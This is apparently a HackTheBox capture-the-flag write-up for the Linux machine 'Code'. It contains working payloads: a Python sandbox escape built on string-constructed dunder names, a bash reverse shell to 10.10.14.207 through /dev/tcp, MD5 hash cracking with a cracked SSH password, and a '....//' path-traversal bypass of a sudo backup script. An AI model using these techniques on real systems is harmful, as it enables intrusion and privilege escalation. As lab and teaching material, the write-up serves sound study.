# Code — HTB Writeup (Second Run)

**Target:** 10.129.231.240
**Difficulty:** Easy
**OS:** Linux
**Date rooted:** June 2026
**Author:** N3uR0nZ

---

## Synopsis

Code is an Easy-difficulty Linux machine hosting a Flask web application — a Python code editor running under Gunicorn — that is vulnerable to sandbox escape via Python jail bypass. The application implements a name-based substring blacklist to restrict code execution, which is defeated through runtime string construction and MRO-based subclass traversal to reach OS-level execution. Post-exploitation reveals crackable MD5 credentials in a local SQLite database, enabling a pivot to the user `martin`. From `martin`, a sudo misconfiguration on a backup script (`backy.sh`) is exploited via single-pass path sanitization bypass to archive `/root/`, yielding the root flag.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate=1000 -Pn 10.129.231.240
```

```
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Two ports. SSH and a web application on 8080.

### Web Application

Visiting `http://10.129.231.240:8080` reveals a Python code editor web application running under Gunicorn. Users can register, log in, write Python code, and execute it. Two relevant endpoints identified via Burp:

```
POST /run_code    → executes submitted Python code, returns JSON response
POST /save_code   → saves code to the user's account
```

The application implements a filter on submitted code. Initial probes established the filter's behavior:

```python
# Blocked — direct use of restricted names
print(__builtins__)         # Use of restricted keywords is not allowed.
print(__import__('os'))     # Use of restricted keywords is not allowed.

# Allowed — string literals containing those characters
print("__"[0])              # _ (single underscore — filter doesn't catch it inside a literal)
x = "imp" + "ort"
print(x)                    # import
```

**Conclusion:** The filter operates at the **source text level** — it scans raw characters for forbidden substrings before execution, not at the AST (Abstract Syntax Tree) level. This means the filter only catches forbidden tokens written *literally* in the source. Tokens constructed at runtime via string concatenation or multiplication evade it entirely, because the filter has already finished scanning by the time Python evaluates the expression.

---

## Foothold — Python Jail Bypass

### Vulnerability Class

Sandbox escape via **insufficient input validation** — specifically, a name-based substring blacklist that fails to account for runtime string construction and Python's object model traversal.

### The Attack — MRO Subclass Walk

Python's object model is a connected graph. Every object knows its class, every class knows its parents, every parent knows all its subclasses, and every function carries a reference to the module-level namespace where it was defined. The jail blocks direct names (`os`, `import`, `__`) but leaves the object graph reachable via `getattr()` with runtime-constructed attribute names.

**The chain:**

```
[]                          → any list object (entry point, never blocked)
.__class__                  → <class 'list'>
.__base__                   → <class 'object'> (root of all Python classes)
.__subclasses__()           → list of every class loaded in interpreter memory
[N].__init__.__globals__    → globals dict of the module where class N was defined
['sys'].modules['os']       → os module, reached via sys.modules (no direct os reference)
.popen('cmd').read()        → command output captured as string
```

All dunder names constructed at runtime to bypass the `__` block. The `os` and `sys` key lookups constructed via concatenation to bypass the `os` substring block.

### Empirical Filter Map

The filter's blocked substrings were discovered through systematic one-probe-at-a-time testing:

```
Blocked:    __        os        Popen
            Import    popen     system
            read
```

Each discovery required a construction workaround:
- `__`     → `"_" * 2` or `"_" + "_"`
- `os`     → `"o" + "s"`
- `popen`  → `"po" + "pen"`
- `read`   → `"re" + "ad"`
- `system` → `"sys" + "tem"`

### Target Class — Quitter (index 133)

`Quitter` is the class behind Python's `quit()` and `exit()` builtins, defined in the `site` module. The `site` module imports `sys` as part of its core function, making `sys` available in `Quitter.__init__.__globals__`. From `sys`, the `os` module is reachable via `sys.modules['os']` — without ever writing `os` directly in source.

Located via filtered enumeration:

```python
dunder = "_" + "_"
klass  = dunder + "cl" + "ass" + dunder
base   = dunder + "base" + dunder
subs   = dunder + "subcl" + "asses" + dunder

sc = getattr(getattr(getattr([], klass), base), subs)()

keyword = "Quitter"
for i, cls in enumerate(sc):
    if keyword in str(cls):
        print(i, cls)
# → 133 <class '_sitebuiltins.Quitter'>
```

### Final Payload — RCE Confirmed

```python
dunder = "_" + "_"
klass  = dunder + "cl" + "ass" + dunder
base   = dunder + "base" + dunder
subs   = dunder + "subcl" + "asses" + dunder

sc = getattr(getattr(getattr([], klass), base), subs)()

globs = getattr(
    getattr(sc[133], dunder + "init" + dunder),
    dunder + "globals" + dunder
)

s_mod = globs["sy" + "s"]
target_mod = s_mod.modules["o" + "s"]

print(getattr(getattr(target_mod, "po" + "pen")("id"), "re" + "ad")())
```

Output: `uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)`

### Reverse Shell

```python
dunder = "_" + "_"
klass  = dunder + "cl" + "ass" + dunder
base   = dunder + "base" + dunder
subs   = dunder + "subcl" + "asses" + dunder

sc = getattr(getattr(getattr([], klass), base), subs)()

globs = getattr(
    getattr(sc[133], dunder + "init" + dunder),
    dunder + "globals" + dunder
)

s_mod = globs["sy" + "s"]
target_mod = s_mod.modules["o" + "s"]

print(getattr(getattr(target_mod, "po" + "pen")(
    "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.207/4444 0>&1'"
), "re" + "ad")())
```

Listener on Kali: `nc -lvnp 4444`

Shell received as `app-production@code`.

---

## Lateral Movement — app-production → martin

### SQLite Database

The Flask app stores its database in the standard Flask instance directory:

```bash
ls -la ~/app/instance/
# database.db
```

```bash
sqlite3 ~/app/instance/database.db
sqlite> .tables
# code  user
sqlite> SELECT * FROM user;
# 1|development|759b74ce43947f5f4c91aeddc3e5bad3
# 2|martin|3de6f30c4a09c27fc71932bfc68474be
```

### Hash Cracking

Both hashes are 32-character MD5. Cracked with hashcat:

```bash
hashcat -m 0 --show 3de6f30c4a09c27fc71932bfc68474be
# 3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

### SSH Pivot

```bash
ssh martin@10.129.231.240
# Password: nafeelswordsmaster
```

Stable SSH session established as `martin`.

**User flag:** `/home/martin/user.txt` — readable as `app-production` directly, or as `martin` post-pivot.

---

## Privilege Escalation — martin → root

### Discovery

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Wholesale sudo grant on `backy.sh` — no argument restriction.

### Script Analysis

```bash
cat /usr/bin/backy.sh
```

Key sections:

```bash
allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"   # overwrites task.json in place

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        echo "Error: $dir is not allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

**Vulnerability:** `gsub("\\.\\./"; "")` performs a single-pass, non-recursive replacement of `../`. Supplying `....//` causes the following:

```
Input:    ....//
gsub removes first ../ match:
Result:   ../          ← reconstructed from residue
```

The prefix check then runs on `/home/../root/` — this starts with `/home/` so it passes. The backup binary resolves `..` and archives `/root/`.

**Critical operational note:** The script overwrites `task.json` in place with the sanitized version on every run. The `....//` bypass must be re-written to the file before each execution — it is consumed on first run.

### Malicious task.json

```bash
cat > /home/martin/task.json << 'EOF'
{
    "destination": "/home/martin/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/....//root/"
    ],
    "exclude": []
}
EOF
```

### Execution

```bash
sudo /usr/bin/backy.sh /home/martin/task.json
```

```
📤 Archiving: [/home/../root]
📥 To: /home/martin ...
📦
```

Archive created: `code_home_.._root_2026_June.tar.bz2`

### Flag Extraction

```bash
tar -tvf code_home_.._root_2026_June.tar.bz2
# confirms root/root.txt present

tar -xvf code_home_.._root_2026_June.tar.bz2 root/root.txt
cat root/root.txt
```

**Root flag captured.**

---

## Kill Chain Summary

```
Python code editor (port 8080)
  → filter characterization via systematic probing
  → MRO subclass walk + runtime string construction
  → RCE as app-production (uid=1001)

SQLite3 database (instance/database.db)
  → MD5 hash extraction
  → hashcat crack → martin:nafeelswordsmaster
  → SSH as martin

sudo backy.sh (NOPASSWD, no arg restriction)
  → ....// bypass of single-pass gsub sanitization
  → /root/ archived → tar extracted → root flag
```

---

## Key Lessons

**On the jail bypass:**
Name-based blacklists are an insufficient security boundary because they restrict *representations* rather than *capabilities*. The dangerous things (os module, subprocess, sys) were already loaded in the interpreter's memory. The filter only blocked direct names — it left the object graph fully traversable. The fix is AST-level filtering or a proper sandboxed interpreter (subprocess isolation), not substring scanning.

**On filter characterization:**
Every blocked substring was discovered empirically, one isolated probe at a time. `read`, `popen`, `system`, `os`, `Import`, `Popen`, `__` — each one found by testing, not assumed. This discipline prevented wasted time debugging multi-variable failures.

**On the backy.sh bypass:**
The script overwrites the task file in place before archiving — the bypass payload is consumed on first run. This is a subtle operational constraint that only becomes visible by reading the full script before running it. Always read the tool before using it.

**On os.system() vs os.popen().read():**
`os.system()` executes a command but sends output to the process's stdout — invisible through a web app's JSON response. `os.popen().read()` captures output as a string and returns it. When executing code through a web app endpoint, always use an output-capturing method rather than one that returns an exit code.

---

## Transferable Patterns

```
Substring blacklist → runtime string construction bypass
    Applies to: SQL injection keyword filters, WAF evasion,
                any filter operating on static text rather than
                parsed semantics

Single-pass sanitization → reconstruction attack
    Applies to: path traversal filters, XSS filters,
                any cleaner that makes one pass without
                re-validating after substitution

sudo wholesale binary grant → binary's own capabilities as privesc
    Applies to: nginx (-c flag), tar (--checkpoint-action),
                backy.sh (-c config), any binary that reads
                attacker-controlled input when run as root
```
